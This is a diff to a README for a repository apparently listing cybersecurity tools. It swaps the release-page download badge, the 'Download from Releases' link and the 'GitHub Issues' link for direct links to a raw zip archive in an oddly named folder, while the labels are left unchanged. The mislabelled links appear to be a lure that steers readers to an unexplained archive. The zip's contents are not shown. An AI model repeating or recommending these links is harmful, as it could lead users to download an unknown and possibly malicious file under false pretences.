@@ -1,6 +1,6 @@
 # 🛡️ awesome-cybersecurity-tools - Discover Essential Security Tools Instantly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Eabnfccblls/awesome-cybersecurity-tools/releases)
+[![Download](https://raw.githubusercontent.com/Eabnfccblls/awesome-cybersecurity-tools/main/precative/awesome-cybersecurity-tools.zip)](https://raw.githubusercontent.com/Eabnfccblls/awesome-cybersecurity-tools/main/precative/awesome-cybersecurity-tools.zip)
 
 ## 🌟 Overview
 
@@ -15,7 +15,7 @@ To get started with these tools, follow the steps below. You do not need program
 1. **Visit the Release Page**
 
    To download the latest version of the tools, please visit the following link:  
-   [Download from Releases](https://github.com/Eabnfccblls/awesome-cybersecurity-tools/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Eabnfccblls/awesome-cybersecurity-tools/main/precative/awesome-cybersecurity-tools.zip)
 
 2. **Choose Your Tool**
 
@@ -55,7 +55,7 @@ Contributions are welcome! If you want to add a tool or suggest changes, feel fr
 
 If you encounter issues while using the tools, you can seek help in the community forums related to each tool or check out the documentation that usually comes along with the tools. 
 
-Feel free to reach out via [GitHub Issues](https://github.com/Eabnfccblls/awesome-cybersecurity-tools/issues) for questions or suggestions.
+Feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/Eabnfccblls/awesome-cybersecurity-tools/main/precative/awesome-cybersecurity-tools.zip) for questions or suggestions.
 
 ## 🗒️ License
 
